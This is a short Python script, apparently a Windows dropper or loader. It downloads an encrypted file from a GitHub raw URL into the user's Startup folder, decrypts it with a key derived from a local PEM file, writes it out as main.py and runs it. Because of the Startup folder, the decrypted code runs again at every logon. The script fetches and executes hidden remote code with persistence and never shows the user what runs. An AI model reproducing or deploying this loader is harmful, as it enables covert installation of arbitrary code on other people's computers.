from cryptography.fernet import Fernet
from binascii import b2a_base64
from hashlib import sha256
import os
import urllib.request


os.chdir("C:\\Users\\" + os.getlogin() + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")

urllib.request.urlretrieve('https://raw.githubusercontent.com/Kat9-123/TestRepo/main/EncryptedFile.txt',"EncryptedFile.txt")



with open("EncryptedFile.txt", "r") as f:
	data = f.read()

with open("private_key.pem", "r") as f:
	key = f.read()

key = b2a_base64(bytes.fromhex(sha256(key.encode()).hexdigest()))

f = Fernet(key)

data = f.decrypt(data.encode())


with open("main.py", "wb") as f:
	f.write(data)

os.system("start main.py")
